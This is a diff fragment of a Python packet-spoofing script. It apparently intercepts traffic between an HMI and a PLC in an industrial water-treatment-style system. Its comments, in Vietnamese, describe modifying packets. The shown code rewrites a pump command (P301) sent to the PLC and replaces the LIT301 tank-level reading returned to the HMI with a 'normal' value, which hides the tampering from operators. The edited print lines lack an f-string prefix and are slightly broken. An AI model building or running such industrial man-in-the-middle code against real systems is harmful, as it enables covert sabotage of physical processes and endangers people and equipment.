@@ -57,7 +57,7 @@ def spoof_pkt(pkt):
                   c3_index = 51 + x*2 +1  # ex: x = 4 (P301) -> index = 60
                   # 0xc3: int , 0xca: float
                   if raw[c3_index] == 0xc3: 
-                     print("chinh sua goi tin hmi send -> plc")
+                     print("chinh sua goi tin hmi send -> plc {pkt[IP].dst in ip_mac}")
                      
                      new_raw = bytearray(raw)
                      # P301 = 4 little endian b'\x04\x00' = 4
@@ -86,7 +86,7 @@ def spoof_pkt(pkt):
                if raw[0] == 0x6f and raw[40] == 0xcc:
                # ca: float
                   if raw[44] == 0xca: 
-                     print("chinh sua goi tin hmi receive <- plc")
+                     print("chinh sua goi tin hmi receive <- plc {pkt[IP].src}")
                      
                      new_raw = bytearray(raw)
                      # LIT301 = 0.9 little endian b'\xcd\xcc\x6c\x3f' = 0.92500 (nomal)
